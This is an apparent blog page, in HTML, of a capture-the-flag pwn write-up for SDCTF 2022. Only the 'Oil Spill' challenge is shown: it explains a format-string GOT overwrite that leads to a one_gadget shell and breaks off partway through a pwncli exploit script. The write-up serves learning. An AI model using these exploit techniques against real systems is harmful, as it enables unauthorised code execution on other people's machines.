@@ -1,0 +1,1264 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>2022-Sdctf-All-Pwn-Wp | roderick - record and learn!</title><meta name="author" content="roderick">
+<meta name="description" content="writeup for all pwn challenges in 2022 sdctf"><meta name="keywords" content='pwn'>
+  <meta itemprop="name" content="2022-Sdctf-All-Pwn-Wp">
+  <meta itemprop="description" content="writeup for all pwn challenges in 2022 sdctf">
+  <meta itemprop="datePublished" content="2022-05-08T15:15:44+08:00">
+  <meta itemprop="dateModified" content="2022-05-08T15:15:44+08:00">
+  <meta itemprop="wordCount" content="2092">
+  <meta itemprop="image" content="https://roderickchan.github.io/">
+  <meta itemprop="keywords" content="pwn"><meta property="og:url" content="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/">
+  <meta property="og:site_name" content="roderick - record and learn!">
+  <meta property="og:title" content="2022-Sdctf-All-Pwn-Wp">
+  <meta property="og:description" content="writeup for all pwn challenges in 2022 sdctf">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-08T15:15:44+08:00">
+    <meta property="article:modified_time" content="2022-05-08T15:15:44+08:00">
+    <meta property="article:tag" content="pwn">
+    <meta property="og:image" content="https://roderickchan.github.io/">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://roderickchan.github.io/">
+  <meta name="twitter:title" content="2022-Sdctf-All-Pwn-Wp">
+  <meta name="twitter:description" content="writeup for all pwn challenges in 2022 sdctf">
+<meta name="application-name" content="roderick - record and learn!">
+<meta name="apple-mobile-web-app-title" content="roderick - record and learn!"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#2d89ef"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#FF7359"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" type="text/html" href="https://roderickchan.github.io/2022-sdctf-all-pwn-wp/" title="2022-Sdctf-All-Pwn-Wp | roderick - record and learn!" /><link rel="prev" type="text/html" href="https://roderickchan.github.io/comment/" title="message board" /><link rel="next" type="text/html" href="https://roderickchan.github.io/2022-cyber-apocalypse-ctf-all-pwn-wp/" title="2022-Cyber-Apocalypse-CTF-All-Pwn-Wp" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "2022-Sdctf-All-Pwn-Wp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/roderickchan.github.io\/2022-sdctf-all-pwn-wp\/"
+    },"image": ["https:\/\/roderickchan.github.io\/images\/apple-devices-preview.webp"],"genre": "posts","keywords": "pwn","wordcount":  2092 ,
+    "url": "https:\/\/roderickchan.github.io\/2022-sdctf-all-pwn-wp\/","datePublished": "2022-05-08T15:15:44+08:00","dateModified": "2022-05-08T15:15:44+08:00","license": "This work is licensed under CC BY-NC-SA-4.0.","publisher": {
+      "@type": "Organization",
+      "name": "roderick","logo": "https:\/\/roderickchan.github.io\/images\/avatar.png"},"author": {
+        "@type": "Person",
+        "name": "roderick"
+      },"description": "writeup for all pwn challenges in 2022 sdctf"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper" data-github-corner="right">
+    <div class="header-title">
+      <a href="/" title="roderick - record and learn!"><img class="logo" src='/logo.png' alt="roderick - record and learn!" height="32" width="32"><span class="header-title-text">roderick&#39;s blog</span></a><span class="typeit header-subtitle"><template>To record and learn!</template></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/collections/"><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden="true"></i> Collections</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/comment/"><i class="fa-regular fa-comments fa-fw fa-sm" aria-hidden="true"></i> Comment</a></li><li class="menu-item">
+              <a class="menu-link" href="https://roderick:rode%40rick@download.roderickchan.cn/" title="My resources download center" rel="noopener noreferrer" target="_blank"><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> Download</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li><li class="menu-item language-switch">
+            <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+            <ul class="sub-menu"><li class="menu-item">No more translations</li></ul>
+          </li><li class="menu-item language-switch auto d-none" aria-hidden="true">
+    <span role="button" aria-label="Select Language" title="Select Language"><i class="fa-solid fa-language fa-fw" aria-hidden="true"></i></span>
+    <ul class="sub-menu"><li class="menu-item active" data-type="artificial">
+              <a href="/2022-sdctf-all-pwn-wp/" data-lang="en" class="menu-link text-secondary" title="English">
+                <i class="fa-solid fa-person fa-fw fa-sm" aria-hidden="true"></i> English</a>
+            </li><li class="menu-item-divider" aria-hidden="true"></li><li class="menu-item" data-type="machine">
+          <a data-lang="english" class="menu-link" title="English">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> English</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="french" class="menu-link" title="Français">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Français</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="russian" class="menu-link" title="Русский язык">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Русский язык</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="chinese_simplified" class="menu-link" title="简体中文">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 简体中文</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="hindi" class="menu-link" title="हिन्दी">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> हिन्दी</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="japanese" class="menu-link" title="日本語">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 日本語</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="chinese_traditional" class="menu-link" title="繁體中文">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 繁體中文</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="spanish" class="menu-link" title="Español">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> Español</a>
+        </li><li class="menu-item" data-type="machine">
+          <a data-lang="korean" class="menu-link" title="한국어">
+            <i class="fa-solid fa-robot fa-fw fa-sm" aria-hidden="true"></i> 한국어</a>
+        </li></ul>
+  </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="roderick - record and learn!"><img class="logo" src='/logo.png' alt="roderick - record and learn!" height="26" width="26"><span class="header-title-text">roderick&#39;s blog</span></a><span class="typeit header-subtitle"><template>To record and learn!</template></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/collections/"><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden="true"></i> Collections</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-info-circle fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/comment/"><i class="fa-regular fa-comments fa-fw fa-sm" aria-hidden="true"></i> Comment</a></li><li class="menu-item"><a class="menu-link" href="https://roderick:rode%40rick@download.roderickchan.cn/" title="My resources download center" rel="noopener noreferrer" target="_blank"><i class="fa-solid fa-download fa-fw fa-sm" aria-hidden="true"></i> Download</a></li><li class="menu-item text-center"><a class="menu-link" href="https://github.com/RoderickChan" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fa-brands fa-github fa-fw' aria-hidden='true'></i> </a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span><span class="menu-system-item language-switch">
+              <span role="button" aria-label="Select Language" title="Select Language">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+              <select class="language-select" onchange="location = this.value;"><option disabled>No more translations</option></select>
+            </span><span id="translate" class="menu-system-item language-switch auto d-none" aria-hidden="true">
+    <span role="button" aria-label="Select Language" title="Select Language" data-current="English">English<i class="dropdown-icon fa-solid fa-chevron-down" aria-hidden="true"></i></span>
+  </span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item" data-separator="/"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" data-separator="/" aria-current="page">2022-Sdctf-All-Pwn-Wp</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"><div class="aside-custom"><img src="https://image.roderickchan.cn/img/roderick_wechat_official_account_white_in_green.png" height="104" width="372">
+
+</div></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>2022-Sdctf-All-Pwn-Wp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><a href="https://www.roderickchan.cn" title="Author"target="_blank" rel="external nofollow noopener noreferrer author" class="author"><img class="avatar" src='https://gravatar.loli.net/avatar/6f579d9b68b13aed76b08fee1c3ede40?s=32&d=mp' alt="roderick" height="16" width="16">&nbsp;roderick</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/pwn-wp/" class="post-category" title="Category - pwn-wp"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> pwn-wp</a></span></div><div class="post-meta-line"><span title="published on 2022-05-08 15:15:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2022-05-08">2022-05-08</time></span>&nbsp;<span title="2092 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2100 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>10 minutes</span>&nbsp;<span id="busuanzi_container_page_pv" class="busuanzi_visitors comment-visitors" data-flag-title="2022-Sdctf-All-Pwn-Wp"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_page_pv">-</span>&nbsp;views
+          </span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#oil-spill">Oil Spill</a>
+          <ul>
+            <li><a href="#checksec">checksec</a></li>
+            <li><a href="#vulnerability">vulnerability</a></li>
+            <li><a href="#solution">solution</a></li>
+            <li><a href="#exp">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#horoscope">Horoscope</a>
+          <ul>
+            <li><a href="#vulnerability-1">vulnerability</a></li>
+            <li><a href="#exp-1">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#breakfastmenu">BreakfastMenu</a>
+          <ul>
+            <li><a href="#checksec-1">checksec</a></li>
+            <li><a href="#vulnerability-2">vulnerability</a></li>
+            <li><a href="#solution-1">solution</a></li>
+            <li><a href="#exp-2">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#secure-horoscope">Secure Horoscope</a>
+          <ul>
+            <li><a href="#vulnerability-3">vulnerability</a></li>
+            <li><a href="#solution-2">solution</a></li>
+            <li><a href="#exp-3">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#shamav">ShamAV</a>
+          <ul>
+            <li><a href="#analysis-of-server">analysis of server</a></li>
+            <li><a href="#solution-3">solution</a></li>
+            <li><a href="#exp-4">EXP</a></li>
+          </ul>
+        </li>
+        <li><a href="#reference">reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><div class="expiration-reminder details admonition note open">
+      <div class="details-summary admonition-title">
+        <i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i>Note<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden="true"></i>
+      </div>
+      <div class="details-content">
+        <div class="admonition-content">This article was last updated on 2022-05-08, the content may be out of date.</div>
+      </div>
+    </div><blockquote>
+<p>I was shocked  when I found  I stayed in a only-me team. Where are my teammates?</p>
+<p>Anyway, I have completed all the tasks of pwn in a afternoon. These tasks are not very hard, and it takes me about <code>4</code> hours. In fact, I have spent almost <code>2</code> hours on solving <code>shamav</code>, this task is a little bit challengeable and interesting.</p></blockquote>
+<h2 class="heading-element" id="oil-spill"><span>Oil Spill</span>
+  <a href="#oil-spill" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="checksec"><span>Checksec</span>
+  <a href="#checksec" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508210905962.png' alt="image-20220508210905962"></p>
+<p>No relro and no pie, the remote glibc version is <code>libc6_2.27-3ubuntu1.5_amd64</code>.</p>
+<h3 class="heading-element" id="vulnerability"><span>Vulnerability</span>
+  <a href="#vulnerability" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>Glibc address is given, then, we can use printf attack:</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220508210726488.png' alt="image-20220508210726488"></p>
+<h3 class="heading-element" id="solution"><span>Solution</span>
+  <a href="#solution" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>It&rsquo;s an easy task about <code>fmt-attack</code>. However, I had a problem when I used my <code>exp.py</code> to attack remote host. The problem is that I cannot get any output from the remote host. After I input something, I get the address of <code>puts/printf/temp</code> and then, the program in remote host is stopped. That means I cannot get glibc address before I input&hellip;&hellip;.Maybe it&rsquo;s caused by my proxy VPN app.</p>
+<p>In order to solve the problem, I decide to find a way to execute the <code>main</code> function again. The <code>.fini_array</code> section is chosen and I plan to replace <code>.fini_array[0]</code> with <code>main</code> address. Unfortunately, the address of <code>.fini_array</code> is <code>0x600A40</code>, which contains <code>\x0a</code>. WTF!!!!</p>
+<p>Then, I try to use <code>partial overwritting</code> to do <code>rop</code>， and I found that there&rsquo;s a gadget  <code>add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</code> nearby puts@glibc.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x0000000000080344: add rsp, 0x38; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
+</span></span><span class="line"><span class="cl">000000000000080970   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5</span></span></code></pre></td></tr></table>
+</div>
+</div><p>To guess half a byte of the gadget, and use <code>fmt-attack</code> to modify the lowest <code>2</code> bytes of <code>puts@got</code>. then make use of <code>magic gadget</code> to change <code>printf@got</code> to <code>one gadget</code> and call printf to get shell.</p>
+<h3 class="heading-element" id="exp"><span>EXP</span>
+  <a href="#exp" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">set_remote_libc</span><span class="p">(</span><span class="s2">&#34;./libc-2.27.so&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;libc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># offset 8</span>
+</span></span><span class="line"><span class="cl"><span class="n">magic</span> <span class="o">=</span> <span class="mh">0x400658</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rbx</span> <span class="o">=</span> <span class="mh">0x4007DA</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">write_num</span> <span class="o">=</span> <span class="mi">10099</span> <span class="c1"># 0x0000000000080773: add rsp, 0x48; pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_off</span> <span class="o">=</span> <span class="mh">0x64f70</span>
+</span></span><span class="line"><span class="cl"><span class="n">og_off</span> <span class="o">=</span> <span class="mh">0x4f432</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">gift</span><span class="o">.</span><span class="n">remote</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_num</span> <span class="o">=</span> <span class="mi">9028</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf_off</span> <span class="o">=</span> <span class="mh">0x64e40</span>
+</span></span><span class="line"><span class="cl">    <span class="n">og_off</span> <span class="o">=</span> <span class="mh">0x4f302</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">flat_z</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:{</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;%</span><span class="si">{</span><span class="n">write_num</span><span class="si">}</span><span class="s2">c%40$hn&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">80</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x400772</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x400772</span><span class="p">,</span> <span class="c1"># ret</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pop_rbx</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x100000000</span> <span class="o">+</span> <span class="n">og_off</span> <span class="o">-</span> <span class="n">printf_off</span><span class="p">,</span> <span class="c1"># printf,</span>
+</span></span><span class="line"><span class="cl">            <span class="mh">0x600c20</span> <span class="o">+</span> <span class="mh">0x3d</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">magic</span><span class="p">,</span>
